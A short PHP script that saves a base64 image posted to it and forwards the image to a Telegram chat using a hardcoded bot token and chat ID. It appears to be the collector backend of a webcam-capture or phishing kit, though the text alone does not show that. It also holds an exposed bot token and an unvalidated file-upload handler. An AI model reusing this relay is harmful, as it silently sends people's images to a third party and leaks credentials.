<?php
$img = $_POST['image'];
$developer = $_POST['developer'];
$folderPath = "upload/";

$image_parts = explode(";base64,", $img);
$image_type_aux = explode("image/", $image_parts[0]);
$image_type = $image_type_aux[1];

$image_base64 = base64_decode($image_parts[1]);
$fileName = uniqid() . '.png';

$file = $folderPath . $fileName;
file_put_contents($file, $image_base64);

// Telegram bot token and chat ID
$botToken = "7496438208:AAEkT1JczwC17_PFjyeQOOzEu0YuabKDyx4";
$chatId = "7336260003";

// Send the image to Telegram
$url = "https://api.telegram.org/bot$botToken/sendPhoto";
$post_fields = array(
    'chat_id' => $chatId,
    'photo' => new CURLFile(realpath($file)),
    'caption' => "🇲🇲𝑫𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓 𝒃𝒚 : $developer"
);

$ch = curl_init();
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Content-Type:multipart/form-data"
));
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
$output = curl_exec($ch);
curl_close($ch);

echo "Image sent to Telegram!";
?>
